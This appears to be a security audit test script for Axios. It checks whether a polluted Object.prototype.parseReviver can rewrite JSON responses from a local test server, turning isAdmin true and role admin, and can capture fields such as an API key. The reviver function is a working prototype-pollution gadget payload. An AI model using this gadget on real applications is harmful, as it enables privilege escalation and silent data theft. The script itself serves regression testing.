import http from "http";
import axios from "axios";

console.log("======================================================");
console.log("   LEO SECURITY AUDIT — AXIOS parseReviver PP Gadget");
console.log("======================================================");
console.log("Active Axios Version:", axios.VERSION);

const server = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(
    JSON.stringify({
      user: "john",
      role: "viewer",
      isAdmin: false,
      balance: 100,
      apiKey: "sk-secret-internal-key",
    }),
  );
});

server.listen(0, async () => {
  const port = server.address().port;
  let passed = 0;
  let failed = 0;

  try {
    // === Before Pollution ===
    const before = await axios.get(`http://127.0.0.1:${port}/api/me`);
    console.log("\n[1] Before Pollution:");
    console.log("isAdmin:", before.data.isAdmin);
    console.log("role:", before.data.role);

    // === Simulate Prototype Pollution ===
    let stolen = {};
    Object.prototype.parseReviver = function (key, value) {
      if (key && typeof value !== "object") stolen[key] = value;
      if (key === "isAdmin") return true; // false → true
      if (key === "role") return "admin"; // viewer → admin
      if (key === "balance") return 999999; // 100 → 999999
      return value; // everything else unchanged
    };

    // === After Pollution ===
    const after = await axios.get(`http://127.0.0.1:${port}/api/me`);
    console.log("\n[2] After Pollution:");
    console.log("isAdmin:", after.data.isAdmin);
    console.log("role:", after.data.role);

    if (
      after.data.isAdmin === true ||
      after.data.role === "admin" ||
      after.data.balance === 999999
    ) {
      console.log("\n  [FAILED] JSON response was surgically modified! VULNERABLE.");
      failed++;
    } else {
      console.log("\n  [SAFE]   JSON response is intact. (Prototype Pollution ignored).");
      passed++;
    }

    if (Object.keys(stolen).length > 0) {
      console.log("  [FAILED] Data was silently exfiltrated via reviver! VULNERABLE.");
      failed++;
    } else {
      console.log("  [SAFE]   No data was exfiltrated.");
      passed++;
    }

    delete Object.prototype.parseReviver;

    console.log("\n======================================================");
    const total = passed + failed;
    if (failed === 0) {
      console.log(
        `  AUDIT PASSED: ${passed}/${total} checks secure. parseReviver gadget mitigated.`,
      );
      process.exit(0);
    } else {
      console.log(`  AUDIT FAILED: ${failed}/${total} checks vulnerable!`);
      process.exit(1);
    }
  } catch (err) {
    console.error("Error during test:", err.message);
    delete Object.prototype.parseReviver;
    process.exit(1);
  } finally {
    server.close();
  }
});
